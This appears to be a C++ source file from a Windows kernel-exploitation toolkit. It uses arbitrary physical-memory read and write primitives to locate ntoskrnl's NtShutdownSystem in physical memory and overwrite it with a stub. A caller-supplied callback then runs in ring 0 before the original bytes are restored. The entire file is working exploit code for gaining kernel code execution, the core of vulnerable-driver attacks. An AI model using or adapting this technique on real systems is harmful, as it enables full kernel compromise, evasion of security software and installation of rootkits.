#include "map.hpp"
#include "shared/phy.hpp"
#include "shared/mem.hpp"

#include <ntdll.h>

#include <algorithm>
#include <fstream>

namespace vdk::map
{
/// \brief Resolved address of RtlFindExportedRoutineByName in kernel space.
///
static resolver_t kernel_resolver{};
/// \brief NtShutdownSystem hook defined in helpers.asm.
///
extern "C" void shutdown_wrapper();
extern "C" void shutdown_wrapper_end();

namespace detail
{
/// \brief Base address of ntoskrnl in kernel space.
///
void* kernel_base;
/// \brief Address of NtShutdownSystem in physical memory.
///
uint64_t shutdown_phy;
/// \brief C++ function executing in CPL 0.
///
extern "C" void shutdown_routine(cb_t* cb)
{
    (*cb)(kernel_base, kernel_resolver);
}

void setup(rdmem_t rdmem, wrmem_t wrmem)
{
    static std::once_flag flag;
    std::call_once(flag, [&]()
    {
        const auto& [base, _, name] = drv::ntoskrnl();
        kernel_base = reinterpret_cast<void*>(base);
        // Read file.
        //
        std::vector<uint8_t> raw;
        fassert(drv::read_file(name, raw));

        uint64_t shutdown_rva{};
        fassert((kernel_resolver = reinterpret_cast<resolver_t>(pe::get_export_rva(raw.data(), "RtlFindExportedRoutineByName") + base)));
        fassert((shutdown_rva    = pe::get_export_rva(raw.data(), "NtShutdownSystem")));

        uint8_t signature[60], original[60];

        std::memcpy(signature, pe::rva_to_ptr<uint8_t>(raw.data(), shutdown_rva), sizeof(signature));

        for (const auto& region : phy::regions())
        {
            for (uint64_t page = region.start; page < region.start + region.size; page += 0x1000)
            {
                const auto addr = page + (shutdown_rva & 0xfff);
                if (rdmem(addr, sizeof(original), original)) [[likely]]
                {
                    if (mem::find_first(original, sizeof(original), reinterpret_cast<const char*>(signature), sizeof(signature))) [[unlikely]]
                    {
                        shutdown_phy = addr;
                        return;
                    }
                }
            }
        }
    });
}
};

void exec(cb_t cb, rdmem_t rdmem, wrmem_t wrmem)
{
    detail::setup(rdmem, wrmem);
    // For thread safety.
    //
    static std::mutex exploit;
    std::lock_guard guard(exploit);
    // Make sure we found NtShutdownSystem in physical memory.
    //
    fassert(detail::shutdown_phy);

    size_t stub_size = reinterpret_cast<uint64_t>(shutdown_wrapper_end) - reinterpret_cast<uint64_t>(shutdown_wrapper);
    auto original    = std::make_unique<uint8_t[]>(stub_size);
    fassert(rdmem(detail::shutdown_phy, stub_size, original.get()));
    fassert(wrmem(detail::shutdown_phy, stub_size, reinterpret_cast<uint8_t*>(shutdown_wrapper)));
    //
    detail::NtShutdownSystem(&cb);
    // Patch back.
    //
    fassert(wrmem(detail::shutdown_phy, stub_size, original.get()));
}
};
